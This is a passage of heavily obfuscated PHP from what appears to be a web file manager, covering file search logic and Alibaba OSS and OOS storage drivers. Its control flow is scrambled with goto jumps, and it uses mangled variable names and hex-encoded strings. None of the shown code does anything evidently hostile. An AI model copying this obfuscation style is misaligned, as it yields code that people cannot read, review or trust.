Model($CĞ¶ñÉ«ùÖ[446])->remove($fóìÊ¸¾öğ); goto D™¬“âÈí; dÔ·ñîÜ«Ï: $CĞ¶ñÉ«ùÖ =& $_SERVER[±á õÁ]; $Fİ¹Ãœ©Ù = $this->listData($E¥Õ §„„Ë); $E²í¥âïöŠ = array_to_keyvalue_group($Fİ¹Ãœ©Ù, $CĞ¶ñÉ«ùÖ[443]); goto DÇ²ƒÄØ•; D™¬“âÈí: } public function userSpace() { $b‘­¼…Â§Ò =& $_SERVER[±á õÁ]; $Fâİò´Ëêš = $this->tablePrefix; $c¨š„¬›õ = array($b‘­¼…Â§Ò[1455] => USER_ID); $CÓ¬À©«› = "{$Fâİò´Ëêš}\x69\x6f\x5f\146\x69\x6c\145\40\x66\151\154\x65\x73\40\157\x6e\x20\x66\x69\x6c\145\163\56\146\151\154\x65\111\x44\40\75\40\x68\x69\x73\x74\x6f\x72\x79\56\146\151\154\145\x49\104"; return $this->alias($b‘­¼…Â§Ò[1860])->where($c¨š„¬›õ)->join($CÓ¬À©«›, $b‘­¼…Â§Ò[1861])->sum($b‘­¼…Â§Ò[87]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($eÜª¯Ï‰ä³) { goto E÷ÙİÂ÷¦ô; eË˜›’·ˆ¬: if (!$EÅâ§å»¾) { return array(); } $D‡ùãÀ‡³ª = $EÅâ§å»¾[$DÈŒØÑƒÏ´[175]]; $F•‘òËò˜ = $DÈŒØÑƒÏ´[7]; goto c‡±Ù…Ü¦Á; c‡±Ù…Ü¦Á: if (!$EÅâ§å»¾[$DÈŒØÑƒÏ´[175]]) { $Dî¿ÄêÎ˜ = array_to_keyvalue($FÓ†Å”Ä´ë, $DÈŒØÑƒÏ´[43], $DÈŒØÑƒÏ´[175]); $D‡ùãÀ‡³ª = implode($DÈŒØÑƒÏ´[57], $Dî¿ÄêÎ˜); $F•‘òËò˜ = $DÈŒØÑƒÏ´[1808]; } $EˆÙ’ò³ÂË = explode($DÈŒØÑƒÏ´[57], trim($D‡ùãÀ‡³ª, $DÈŒØÑƒÏ´[57])); return array($F•‘òËò˜, $EˆÙ’ò³ÂË); goto Aôê‡–ÆØ; E÷ÙİÂ÷¦ô: $DÈŒØÑƒÏ´ =& $_SERVER[±á õÁ]; $FÓ†Å”Ä´ë = KodIO::fileTypeList(); $EÅâ§å»¾ = $FÓ†Å”Ä´ë[$eÜª¯Ï‰ä³]; goto eË˜›’·ˆ¬; Aôê‡–ÆØ: } public function listPathType($FÊ•øè¢²ƒ) { $eÉ‰í×¥ƒ¨ =& $_SERVER[±á õÁ]; $eâ‘ÕÁìºÀ = $this->fileTypeWhere($FÊ•øè¢²ƒ); if (!$eâ‘ÕÁìºÀ) { return array(); } $aÀ¢öï±ó’ = array($eÉ‰í×¥ƒ¨[546] => SourceModel::TYPE_USER, $eÉ‰í×¥ƒ¨[547] => USER_ID, $eÉ‰í×¥ƒ¨[543] => 0, $eÉ‰í×¥ƒ¨[544] => $eâ‘ÕÁìºÀ); return $this->listSource($aÀ¢öï±ó’); } public function listSearch($DÔ¾‰íù‘Ü, $fÕá˜İÙéö = 300) { goto e‡Á‹Ë·‘ò; e‡Á‹Ë·‘ò: $Bó”Ê±ø¥‡ =& $_SERVER[±á õÁ]; if (isset($DÔ¾‰íù‘Ü[$Bó”Ê±ø¥‡[1704]]) && $DÔ¾‰íù‘Ü[$Bó”Ê±ø¥‡[1704]]) { $DÔ¾‰íù‘Ü[$Bó”Ê±ø¥‡[1704]] = str_replace($Bó”Ê±ø¥‡[382], $Bó”Ê±ø¥‡[1862], trim($DÔ¾‰íù‘Ü[$Bó”Ê±ø¥‡[1704]])); } $có¹¸¼²½Ş = $this->_parseSearchWhere($DÔ¾‰íù‘Ü); goto f ¹ßùÖæ; cêòÑÃ¢¶: $F“ºäÂ×Ä = $this->distinct(!0)->field($Eã„·¸ ˜œ)->where($có¹¸¼²½Ş)->selectPage($fÕá˜İÙéö); $this->_listSearchDesc($F“ºäÂ×Ä, $DÔ¾‰íù‘Ü, $F¸ÙÉ­ºŞº); $this->_listSearchTag($F“ºäÂ×Ä, $DÔ¾‰íù‘Ü, $F¸ÙÉ­ºŞº); goto fá–ÙËŒ¨; f ¹ßùÖæ: if (!isset($có¹¸¼²½Ş[$Bó”Ê±ø¥‡[421]])) { $có¹¸¼²½Ş[$Bó”Ê±ø¥‡[421]] = 0; } $Eã„·¸ ˜œ = $Bó”Ê±ø¥‡[1863]; $F¸ÙÉ­ºŞº = $Eã„·¸ ˜œ; goto d»‘áùöÊö; d»‘áùöÊö: $this->_listSearchBindPinyin($DÔ¾‰íù‘Ü, $có¹¸¼²½Ş, $Eã„·¸ ˜œ); $this->alias($Bó”Ê±ø¥‡[512])->_makeOrder(); $có¹¸¼²½Ş = $this->parseWhereLike($có¹¸¼²½Ş); goto cêòÑÃ¢¶; fá–ÙËŒ¨: $this->_listSearchGroupTag($F“ºäÂ×Ä, $DÔ¾‰íù‘Ü, $F¸ÙÉ­ºŞº); $this->_listDataApply($F“ºäÂ×Ä[$Bó”Ê±ø¥‡[370]]); $this->_listMake($F“ºäÂ×Ä); goto f‘ÆÙç×”; f‘ÆÙç×”: return $F“ºäÂ×Ä; goto DÌ¡‚ç½›î; DÌ¡‚ç½›î: } private function _listSearchTag(&$B´³¯Ìòğ˜, $AŞ·ÖÓŒ, $B¾é“Ä­Œ¨) { goto f¨ÏŸÜåˆõ; aƒÍœŠ •ß: if (!$f¬ç ¯†÷) { return; } $bÜ’¯°½Õä = array($C’Ş‡Àô¼¸[417] => array($C’Ş‡Àô¼¸[7], $f¬ç ¯†÷), $C’Ş‡Àô¼¸[1463] => USER_ID); $Fõ˜³æ¼‰§ = Model($C’Ş‡Àô¼¸[418])->field($C’Ş‡Àô¼¸[85])->where($bÜ’¯°½Õä)->select(); goto F¸Ã©•ƒŒç; a¢¬•¼ßøÏ: $f¬ç ¯†÷ = array(); $dÄáë•“Ç¹ = $AŞ·ÖÓŒ[$C’Ş‡Àô¼¸[1704]]; foreach ($F»ˆ–ï˜¸ as $DÔŠ›¢îØ×) { $d¥ÂÆÌ›Ù¿ = $DÔŠ›¢îØ×[$C’Ş‡Àô¼¸[38]]; $fÛÃä¦Îõ™ = str_replace($C’Ş‡Àô¼¸[60], $C’Ş‡Àô¼¸[43], Pinyin::encode($d¥ÂÆÌ›Ù¿)); if (stripos($d¥ÂÆÌ›Ù¿, $dÄáë•“Ç¹) !== !1 || stripos($fÛÃä¦Îõ™, $dÄáë•“Ç¹) !== !1) { $f¬ç ¯†÷[] = $DÔŠ›¢îØ×[$C’Ş‡Àô¼¸[391]]; } } goto aƒÍœŠ •ß; f¨ÏŸÜåˆõ: $C’Ş‡Àô¼¸ =& $_SERVER[±á õÁ]; if (!$AŞ·ÖÓŒ[$C’Ş‡Àô¼¸[1704]] || $B´³¯Ìòğ˜[$C’Ş‡Àô¼¸[367]][$C’Ş‡Àô¼¸[356]] > 1) { return; } $F»ˆ–ï˜¸ = Model($C’Ş‡Àô¼¸[1864])->listData(); goto a¢¬•¼ßøÏ; F¸Ã©•ƒŒç: $Fõ˜³æ¼‰§ = array_to_keyvalue($Fõ˜³æ¼‰§, $C’Ş‡Àô¼¸[43], $C’Ş‡Àô¼¸[85]); $Cïçê¯œ­” = array_unique($Fõ˜³æ¼‰§); $this->_listSearchMerge($B´³¯Ìòğ˜, $AŞ·ÖÓŒ, $B¾é“Ä­Œ¨, $Cïçê¯œ­”); goto Eô°ÀçÎİ°; Eô°ÀçÎİ°: } private function _listSearchDesc(&$b–çƒ¯«ˆ¼, $E¸šŞïª’ö, $Eº¹»Çç¢Ç) { goto D£·µ†±ÚÖ; dÆ“¥ì™¢: $b¢ÇÙôõ¢ª = array_unique($b¢ÇÙôõ¢ª); if (!$b¢ÇÙôõ¢ª) { return; } $F­œ¨¬¬ƒ„ = array($E—ÕÚ—[393] => array($E—ÕÚ—[7], $b¢ÇÙôõ¢ª), $E—ÕÚ—[99] => $E—ÕÚ—[429], $E—ÕÚ—[375] => array($E—ÕÚ—[381], $E—ÕÚ—[1706] . $E¸šŞïª’ö[$E—ÕÚ—[1704]] . $E—ÕÚ—[1706])); goto eáİš´‚‰; D£·µ†±ÚÖ: $E—ÕÚ— =& $_SERVER[±á õÁ]; if (!$E¸šŞïª’ö[$E—ÕÚ—[1704]] || $b–çƒ¯«ˆ¼[$E—ÕÚ—[367]][$E—ÕÚ—[356]] > 1) { return; } $b¢ÇÙôõ¢ª = $this->listSearchChildren($E¸šŞïª’ö[$E—ÕÚ—[486]]); goto dÆ“¥ì™¢; eáİš´‚‰: $e‰çÑĞİ¾¦ = Model($E—ÕÚ—[529])->field($E—ÕÚ—[393])->where($F­œ¨¬¬ƒ„)->select(); $a„Æò•¥› = array_to_keyvalue($e‰çÑĞİ¾¦, $E—ÕÚ—[43], $E—ÕÚ—[393]); $this->_listSearchMerge($b–çƒ¯«ˆ¼, $E¸šŞïª’ö, $Eº¹»Çç¢Ç, $a„Æò•¥›); goto C÷¬Ù¡ÖÁ²; C÷¬Ù¡ÖÁ²: } private function _listSearchGroupTag(&$fÑº§İ ¿“, $A…š³éøÍ, $d®êí°¹§à) { goto F¼ÉÑŞù‚æ; aÕ…“›µ­ø: if (!$F¨‹òÛ‰óî) { return; } $AäÑÂù© = array($e®İ’®‚˜[417] => array($e®İ’®‚˜[7], $F¨‹òÛ‰óî), $e®İ’®‚˜[1463] => 0, $e®İ’®‚˜[39] => $e®İ’®‚˜[1724] . $a‚Ô¡’¶»); $Bà§éì¸Ë’ = Model($e®İ’®‚˜[418])->field($e®İ’®‚˜[85])->where($AäÑÂù©)->select(); goto Eğ¶Ö©çƒï; F¼ÉÑŞù‚æ: $e®İ’®‚˜ =& $_SERVER[±á õÁ]; if (!$A…š³éøÍ[$e®İ’®‚˜[1704]] || $fÑº§İ ¿“[$e®İ’®‚˜[367]][$e®İ’®‚˜[356]] > 1 || !$A…š³éøÍ[$e®İ’®‚˜[486]]) { return; } $B“¥–£¾ƒÏ = $this->sourceInfo($A…š³éøÍ[$e®İ’®‚˜[486]]); goto b©®šº˜×¿; Fƒ¬ºùƒ¶: $F¨‹òÛ‰óî = array(); $Aì´­Ê™Ä¾ = $A…š³éøÍ[$e®İ’®‚˜[1704]]; foreach ($eº³ Ÿœ¹¼[$e®İ’®‚˜[370]] as $d‚Áµ­œò) { $F„›Î—œ„µ = $d‚Áµ­œò[$e®İ’®‚˜[38]]; $bÄƒï¦±… = str_replace($e®İ’®‚˜[60], $e®İ’®‚˜[43], Pinyin::encode($F„›Î—œ„µ)); if (stripos($F„›Î—œ„µ, $Aì´­Ê™Ä¾) !== !1 || stripos($bÄƒï¦±…, $Aì´­Ê™Ä¾) !== !1) { $F¨‹òÛ‰óî[] = $d‚Áµ­œò[$e®İ’®‚˜[391]]; } } goto aÕ…“›µ­ø; Eğ¶Ö©çƒï: $Bà§éì¸Ë’ = array_to_keyvalue($Bà§éì¸Ë’, $e®İ’®‚˜[43], $e®İ’®‚˜[85]); $eâ»ñ’ã¨ = array_unique($Bà§éì¸Ë’); $this->_listSearchMerge($fÑº§İ ¿“, $A…š³éøÍ, $d®êí°¹§à, $eâ»ñ’ã¨); goto bŸ‹•”Á˜ñ; b©®šº˜×¿: if (!$B“¥–£¾ƒÏ || $B“¥–£¾ƒÏ[$e®İ’®‚˜[395]] != SourceModel::TYPE_GROUP) { return; } $a‚Ô¡’¶» = $B“¥–£¾ƒÏ[$e®İ’®‚˜[481]]; $eº³ Ÿœ¹¼ = Model($e®İ’®‚˜[1865])->get($a‚Ô¡’¶»); goto Fƒ¬ºùƒ¶; bŸ‹•”Á˜ñ: } private function _listSearchMerge(&$Dê¯Ï¸•¤, $bÔöˆì·îÃ, $f˜”Ä¡İì±, $fÅ¿ëÜÄ†‘) { goto F×ÌÀœ¢“Ú; F×ÌÀœ¢“Ú: $E™Ÿ²ÉÀ– =& $_SERVER[±á õÁ]; if (!$fÅ¿ëÜÄ†‘) { return; } $DñĞîÌêº¹ = array_to_keyvalue($Dê¯Ï¸•¤[$E™Ÿ²ÉÀ–[370]], $E™Ÿ²ÉÀ–[43], $E™Ÿ²ÉÀ–[393]); goto Dî‘àÒ©Ó‹; CÓƒ‡õÒí: foreach ($A‚š¸†½ˆ as $E‚ì¤óÀ¤õ) { $dìá„ó¾ = $E™Ÿ²ÉÀ–[57] . $bÔöˆì·îÃ[$E™Ÿ²ÉÀ–[486]] . $E™Ÿ²ÉÀ–[57]; if (stripos($E‚ì¤óÀ¤õ[$E™Ÿ²ÉÀ–[484]], $dìá„ó¾) !== !1) { $aææŠõÎÓá[] = $E‚ì¤óÀ¤õ; } } $Dê¯Ï¸•¤[$E™Ÿ²ÉÀ–[370]] = array_merge($aææŠõÎÓá, $Dê¯Ï¸•¤[$E™Ÿ²ÉÀ–[370]]); $Dê¯Ï¸•¤[$E™Ÿ²ÉÀ–[367]][$E™Ÿ²ÉÀ–[368]] += count($aææŠõÎÓá); goto e¾„«˜í®—; Dî‘àÒ©Ó‹: $f‰§¹ö¹†È = array_diff($fÅ¿ëÜÄ†‘, $DñĞîÌêº¹); if (!$f‰§¹ö¹†È) { return; } $e°á¯§ØÁÑ = array($E™Ÿ²ÉÀ–[393] => array($E™Ÿ²ÉÀ–[7], $f‰§¹ö¹†È)); goto e™Ş¥”øŞ¾; e™Ş¥”øŞ¾: $A‚š¸†½ˆ = $this->field($f˜”Ä¡İì±)->where($e°á¯§ØÁÑ)->select(); if (!$A‚š¸†½ˆ) { return; } $aææŠõÎÓá = array(); goto CÓƒ‡õÒí; e¾„«˜í®—: } public function listSearchChildren($Aˆ‘¯»ç†Ù, $A¬±š¼¬Üè = 5000) { goto f›ÙëŞ·—Ø; CĞ•Çâñ÷ä: $bƒ„öŞïØÉ = $this->field($e¡¾Ó‘—å[393])->where($A°ïƒ·…)->select(); $F Èææ–ˆ½ = array_to_keyvalue($bƒ„öŞïØÉ, $e¡¾Ó‘—å[43], $e¡¾Ó‘—å[393]); return $F Èææ–ˆ½; goto B˜¢Ì¢ÜÙ”; Fù‘­©Â¬±: $A°ïƒ·… = array($e¡¾Ó‘—å[484] => array($e¡¾Ó‘—å[381], $D‡ÀŠÕ‡†Ó[$e¡¾Ó‘—å[484]] . $D‡ÀŠÕ‡†Ó[$e¡¾Ó‘—å[393]] . $e¡¾Ó‘—å[509])); $EÆ®”ğƒÖõ = $this->field($e¡¾Ó‘—å[393])->cache(null, 600)->where($A°ïƒ·…)->count(); if ($EÆ®”ğƒÖõ > $A¬±š¼¬Üè) { return $this->_listSearchChildrenNear($Aˆ‘¯»ç†Ù, $A¬±š¼¬Üè); } goto CĞ•Çâñ÷ä; f›ÙëŞ·—Ø: $e¡¾Ó‘—å =& $_SERVER[±á õÁ]; $F Èææ–ˆ½ = array(); $D‡ÀŠÕ‡†Ó = $this->sourceInfo($Aˆ‘¯»ç†Ù); goto Fù‘­©Â¬±; B˜¢Ì¢ÜÙ”: } private function _listSearchChildrenNear($B·èâÂĞ” , $fƒª·’) { goto bŠÂ¥­Í•; cÃ§¨°¹µ”: $FÔ¦·ìê­ƒ = $this->field($A—ğÚ‡ö[1866])->where($dŠé‚Ó…õ„)->select(); $F‘ğ³Ş³Œ¬ = array_to_keyvalue(array_filter_by_field($FÔ¦·ìê­ƒ, $A—ğÚ‡ö[394], $A—ğÚ‡ö[93]), $A—ğÚ‡ö[43], $A—ğÚ‡ö[393]); $D½Ç¯“Á†¨ = array_merge($D½Ç¯“Á†¨, array_to_keyvalue($FÔ¦·ìê­ƒ, $A—ğÚ‡ö[43], $A—ğÚ‡ö[393])); goto EæÏğ„»í; EæÏğ„»í: if (!$F‘ğ³Ş³Œ¬) { return $D½Ç¯“Á†¨; } $dŠé‚Ó…õ„ = array($A—ğÚ‡ö[486] => array($A—ğÚ‡ö[7], $F‘ğ³Ş³Œ¬)); $FÔ¦·ìê­ƒ = $this->field($A—ğÚ‡ö[1866])->where($dŠé‚Ó…õ„)->limit($fƒª·’)->select(); goto DºË“óïÏ; bŠÂ¥­Í•: $A—ğÚ‡ö =& $_SERVER[±á õÁ]; $D½Ç¯“Á†¨ = array(); $dŠé‚Ó…õ„ = array($A—ğÚ‡ö[486] => $B·èâÂĞ” ); goto cÃ§¨°¹µ”; DºË“óïÏ: $D½Ç¯“Á†¨ = array_merge($D½Ç¯“Á†¨, array_to_keyvalue($FÔ¦·ìê­ƒ, $A—ğÚ‡ö[43], $A—ğÚ‡ö[393])); $D½Ç¯“Á†¨ = array_slice($D½Ç¯“Á†¨, 0, $fƒª·’); return $D½Ç¯“Á†¨; goto CØ«ëĞŠÚ; CØ«ëĞŠÚ: } private function _listSearchBindPinyin($bŞÌø®ÄÒ³, &$B“Ğ£÷²Ÿ¢, &$e±â¸ïÔêÅ) { goto cÏƒµÓ½ƒê; CÀÛÔÚÃÊ: $eñ°ÁŸíóÄ = array(); $e±â¸ïÔêÅ = str_replace(array($A‰æ˜ïß†[14], $A‰æ˜ïß†[60], $A‰æ˜ïß†[1867]), $A‰æ˜ïß†[43], $e±â¸ïÔêÅ); $e±â¸ïÔêÅ = $A‰æ˜ïß†[1868] . str_replace($A‰æ˜ïß†[57], $A‰æ˜ïß†[1869], $e±â¸ïÔêÅ); goto aÀ‰—öÕñ; aÀ‰—öÕñ: $cíÇí‚­² = $B“Ğ£÷²Ÿ¢[$A‰æ˜ïß†[38]]; unset($B“Ğ£÷²Ÿ¢[$A‰æ˜ïß†[38]]); foreach ($B“Ğ£÷²Ÿ¢ as $eÉ¯é…›§¸ => $c·¦ï×º¿à) { $eñ°ÁŸíóÄ[$A‰æ˜ïß†[1868] . $eÉ¯é…›§¸] = $c·¦ï×º¿à; } goto CÁÚ´ˆÔŸ; cÏƒµÓ½ƒê: $A‰æ˜ïß† =& $_SERVER[±á õÁ]; if (!Input::check($bŞÌø®ÄÒ³[$A‰æ˜ïß†[1704]], $A‰æ˜ïß†[321]) || strlen($bŞÌø®ÄÒ³[$A‰æ˜ïß†[1704]]) < 2) { return; } $B’›©Œ‚Ù˜ = "\x4c\x45\x46\124\x20\x4a\x4f\x49\x4e\x20{$this->tablePrefix}\x69\157\137\163\x6f\165\x72\143\145\x5f\x6d\x65\164\141\40\155\x65\164\x61\x20\157\156\40\163\x6f\x75\162\x63\145\x2e\163\157\x75\162\x63\145\111\104\40\75\40\155\145\x74\x61\56\x73\157\x75\162\143\x65\111\x44"; goto CÀÛÔÚÃÊ; CÁÚ´ˆÔŸ: foreach ($cíÇí‚­² as $b‰‹ ñóŠê) { $eñ°ÁŸíóÄ[] = array($A‰æ˜ïß†[1870] => $b‰‹ ñóŠê, $A‰æ˜ïß†[930] => $A‰æ˜ïß†[1708], array($A‰æ˜ïß†[1871] => $b‰‹ ñóŠê, $A‰æ˜ïß†[1872] => array($A‰æ˜ïß†[7], array($A‰æ˜ïß†[440], $A‰æ˜ïß†[439])))); } $this->join($B’›©Œ‚Ù˜); $B“Ğ£÷²Ÿ¢ = $eñ°ÁŸíóÄ; goto f»ÃÏë­Ô; f»ÃÏë­Ô: } private function _parseSearchWhere($E™‰¹…“õŸ) { goto C²ºëáàèÅ; cî¾î¯˜í: if (isset($E™‰¹…“õŸ[$cŠ„ò†¬•¥[559]])) { $D›¶À•ãÍŒ[] = array($cŠ„ò†¬•¥[403] => $E™‰¹…“õŸ[$cŠ„ò†¬•¥[559]], $cŠ„ò†¬•¥[402] => $E™‰¹…“õŸ[$cŠ„ò†¬•¥[559]], $cŠ„ò†¬•¥[930] => $cŠ„ò†¬•¥[1708]); } if (isset($E™‰¹…“õŸ[$cŠ„ò†¬•¥[396]])) { $CßöÒ¡ôÉ¼ = $E™‰¹…“õŸ[$cŠ„ò†¬•¥[396]]; if ($CßöÒ¡ôÉ¼ == $cŠ„ò†¬•¥[86]) { $D›¶À•ãÍŒ[$cŠ„ò†¬•¥[394]] = 1; } else { if ($CßöÒ¡ôÉ¼ == $cŠ„ò†¬•¥[1878]) { $D›¶À•ãÍŒ[$cŠ„ò†¬•¥[394]] = 0; } else { if ($CßöÒ¡ôÉ¼) { $CßöÒ¡ôÉ¼ = is_array($CßöÒ¡ôÉ¼) ? $CßöÒ¡ôÉ¼ : explode($cŠ„ò†¬•¥[57], $CßöÒ¡ôÉ¼); $D›¶À•ãÍŒ[$cŠ„ò†¬•¥[396]] = array($cŠ„ò†¬•¥[408], $CßöÒ¡ôÉ¼); $D›¶À•ãÍŒ[$cŠ„ò†¬•¥[394]] = 0; } } } } if (isset($E™‰¹…“õŸ[$cŠ„ò†¬•¥[486]])) { $C–º„ùÔˆ˜ = $this->sourceInfo($E™‰¹…“õŸ[$cŠ„ò†¬•¥[486]]); $D›¶À•ãÍŒ[$cŠ„ò†¬•¥[550]] = array($cŠ„ò†¬•¥[508], $C–º„ùÔˆ˜[$cŠ„ò†¬•¥[484]] . $E™‰¹…“õŸ[$cŠ„ò†¬•¥[486]] . $cŠ„ò†¬•¥[509]); } goto eÓë¾Ü¸; fø±õæâ¦ô: if (isset($E™‰¹…“õŸ[$cŠ„ò†¬•¥[472]])) { $cÛ¡ìËÜÆ = array($cŠ„ò†¬•¥[1874], $E™‰¹…“õŸ[$cŠ„ò†¬•¥[472]]); if ($D›¶À•ãÍŒ[$cŠ„ò†¬•¥[117]]) { $D›¶À•ãÍŒ[$cŠ„ò†¬•¥[117]] = array($D›¶À•ãÍŒ[$cŠ„ò†¬•¥[117]], $cÛ¡ìËÜÆ, $cŠ„ò†¬•¥[1875]); } else { $D›¶À•ãÍŒ[$cŠ„ò†¬•¥[117]] = $cÛ¡ìËÜÆ; } } if (isset($E™‰¹…“õŸ[$cŠ„ò†¬•¥[1876]])) { $D›¶À•ãÍŒ[$cŠ„ò†¬•¥[87]] = array($cŠ„ò†¬•¥[1873], $E™‰¹…“õŸ[$cŠ„ò†¬•¥[1876]]); } if (isset($E™‰¹…“õŸ[$cŠ„ò†¬•¥[1877]])) { $cÛ¡ìËÜÆ = array($cŠ„ò†¬•¥[1874], $E™‰¹…“õŸ[$cŠ„ò†¬•¥[1877]]); if ($D›¶À•ãÍŒ[$cŠ„ò†¬•¥[87]]) { $D›¶À•ãÍŒ[$cŠ„ò†¬•¥[87]] = array($D›¶À•ãÍŒ[$cŠ„ò†¬•¥[87]], $cÛ¡ìËÜÆ, $cŠ„ò†¬•¥[1875]); } else { $D›¶À•ãÍŒ[$cŠ„ò†¬•¥[87]] = $cÛ¡ìËÜÆ; } } goto cî¾î¯˜í; C²ºëáàèÅ: $cŠ„ò†¬•¥ =& $_SERVER[±á õÁ]; $D›¶À•ãÍŒ = array(); if (isset($E™‰¹…“õŸ[$cŠ„ò†¬•¥[727]])) { $D›¶À•ãÍŒ[$cŠ„ò†¬•¥[117]] = array($cŠ„ò†¬•¥[1873], $E™‰¹…“õŸ[$cŠ„ò†¬•¥[727]]); } goto fø±õæâ¦ô; eÓë¾Ü¸: if (isset($E™‰¹…“õŸ[$cŠ„ò†¬•¥[1704]]) && $E™‰¹…“õŸ[$cŠ„ò†¬•¥[1704]]) { $Dğêé„ø… = $E™‰¹…“õŸ[$cŠ„ò†¬•¥[1704]]; $EÍ’ºÑµ§î = explode($cŠ„ò†¬•¥[60], $Dğêé„ø…); if (strlen($Dğêé„ø…) > 2 && (substr($Dğêé„ø…, 0, 1) == $cŠ„ò†¬•¥[123] && substr($Dğêé„ø…, -1) == $cŠ„ò†¬•¥[123]) || substr($Dğêé„ø…, 0, 1) == $cŠ„ò†¬•¥[65] && substr($Dğêé„ø…, -1) == $cŠ„ò†¬•¥[65]) { $Dğêé„ø… = substr($Dğêé„ø…, 1, -1); $EÍ’ºÑµ§î = array($Dğêé„ø…); } $D›¶À•ãÍŒ[$cŠ„ò†¬•¥[38]] = array(array($cŠ„ò†¬•¥[508], $cŠ„ò†¬•¥[1706] . $Dğêé„ø… . $cŠ„ò†¬•¥[1706])); if (count($EÍ’ºÑµ§î) > 1) { $D›¶À•ãÍŒ[$cŠ„ò†¬•¥[38]] = array(); foreach ($EÍ’ºÑµ§î as $bÖ‚Û•èÖ¦) { if (!trim($bÖ‚Û•èÖ¦)) { continue; } $D›¶À•ãÍŒ[$cŠ„ò†¬•¥[38]][] = array($cŠ„ò†¬•¥[508], $cŠ„ò†¬•¥[1706] . trim($bÖ‚Û•èÖ¦) . $cŠ„ò†¬•¥[1706]); } } } return $D›¶À•ãÍŒ; goto DÃİÀ­Èàí; DÃİÀ­Èàí: } } goto A›ãê†‚ß; CÓ®øõº: class PathDriverOOS extends PathDriverBaseS3 { public function __construct($fµŒ¹‡¿â) { parent::__construct($fµŒ¹‡¿â); $this->signatureVersion($_SERVER[±á õÁ][218]); } public function fileOutLink($b™×‰…¿ß ) { $A¨¾ÄäÌ“ =& $_SERVER[±á õÁ]; if (substr($b™×‰…¿ß , 0, 7) == $A¨¾ÄäÌ“[1136]) { $b™×‰…¿ß  = $A¨¾ÄäÌ“[1137] . substr($b™×‰…¿ß , 7); } header($A¨¾ÄäÌ“[166] . $b™×‰…¿ß ); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public function __construct($d—Ïñ¹ÛÏµ) { parent::__construct(); include_once SDK_DIR . $_SERVER[±á õÁ][1191]; $this->_init($d—Ïñ¹ÛÏµ); } public function _init($DáÏíÈÖøÂ) { $aö°éƒœ =& $_SERVER[±á õÁ]; foreach ($DáÏíÈÖøÂ as $aâ¤÷¦Úéõ => $c­Ù§ç’‡Ø) { if (isset($this->{$aâ¤÷¦Úéõ})) { $this->{$aâ¤÷¦Úéõ} = $c­Ù§ç’‡Ø; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($aö°éƒœ[1192] . LNG($aö°éƒœ[1193])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { goto aƒ‚ñ™ò´É; F‡ ½ìØÓ›: $AŸšÄ¸íˆ…->setMaxAgeSeconds(600); $AŸšÄ¸íˆ…->addExposeHeader($Dãˆ¥¡ì¹[1199]); $AŸšÄ¸íˆ…->addAllowedHeader($Dãˆ¥¡ì¹[1194]); goto D¬ğÀÅ‘¾×; eÉŠ™±«…¼: $AŸšÄ¸íˆ…->addAllowedOrigin($Dãˆ¥¡ì¹[1194]); $AŸšÄ¸íˆ…->addAllowedMethod($Dãˆ¥¡ì¹[1195]); $AŸšÄ¸íˆ…->addAllowedMethod($Dãˆ¥¡ì¹[1196]); goto A‹¨¶¢Á‡ë; D¬ğÀÅ‘¾×: $eÏˆÊ…š ->addRule($AŸšÄ¸íˆ…); try { $this->client->putBucketCors($this->bucket, $eÏˆÊ…š ); } catch (OSS\Core\OssException $Fáµà»»Ù) { return !1; } return !0; goto a™„Ô„ìÄ; A‹¨¶¢Á‡ë: $AŸšÄ¸íˆ…->addAllowedMethod($Dãˆ¥¡ì¹[1197]); $AŸšÄ¸íˆ…->addAllowedMethod($Dãˆ¥¡ì¹[1198]); $AŸšÄ¸íˆ…->addAllowedMethod($Dãˆ¥¡ì¹[165]); goto F‡ ½ìØÓ›; aƒ‚ñ™ò´É: $Dãˆ¥¡ì¹ =& $_SERVER[±á õÁ]; $eÏˆÊ…š  = new OSS\Model\CorsConfig(); $AŸšÄ¸íˆ… = new OSS\Model\CorsRule(); goto eÉŠ™±«…¼; a™„Ô„ìÄ: } public function getBucketCors() { goto fª¯Ñß¯Œà; FÁ„¼·¥¶: $C‚ø‚­ô÷ = $EèæÚÅÑäÄ[0]->getMaxAgeSeconds(); $aèßƒä˜Ó = $EèæÚÅÑäÄ[0]->getExposeHeaders(); $fÛù½Ï°¼Ñ = $EèæÚÅÑäÄ[0]->getAllowedHeaders(); goto F……Îô÷Ä; F……Îô÷Ä: return array($b‚Èíç¯ŠÑ[189] => isset($cÓ¦°ˆ[0]) ? $cÓ¦°ˆ[0] : $b‚Èíç¯ŠÑ[43], $b‚Èíç¯ŠÑ[193] => $fìƒ¤à¹·, $b‚Èíç¯ŠÑ[1200] => $C‚ø‚­ô÷, $b‚Èíç¯ŠÑ[1201] => isset($aèßƒä˜Ó[0]) ? $aèßƒä˜Ó[0] : $b‚Èíç¯ŠÑ[43], $b‚Èíç¯ŠÑ[191] => isset($fÛù½Ï°¼Ñ[0]) ? $fÛù½Ï°¼Ñ[0] : $b‚Èíç¯ŠÑ[43]); goto BÄÂãÆØ‘ø; cÙĞÑ…‘°š: if (!$bŞ˜µáåÃÛ || !($EèæÚÅÑäÄ = $bŞ˜µáåÃÛ->getRules())) { return null; } $cÓ¦°ˆ = $EèæÚÅÑäÄ[0]->getAllowedOrigins(); $fìƒ¤à¹· = $EèæÚÅÑäÄ[0]->getAllowedMethods(); goto FÁ„¼·¥¶; fª¯Ñß¯Œà: $b‚Èíç¯ŠÑ =& $_SERVER[±á õÁ]; $bŞ˜µáåÃÛ = null; try { $bŞ˜µáåÃÛ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $eòâ„ ‚ô®) { return null; } goto cÙĞÑ…‘°š; BÄÂãÆØ‘ø: } public function isBucketCors() { goto fÅÚğÎ®²; c•‘•åù˜¹: if ($BŠ–±áùâ[$Bï¹„‹Ü—ğ[189]] != $Bï¹„‹Ü—ğ[190] || $BŠ–±áùâ[$Bï¹„‹Ü—ğ[191]] != $Bï¹„‹Ü—ğ[190]) { return !1; } $E¾³„·Šã¼ = array_map($Bï¹„‹Ü—ğ[192], 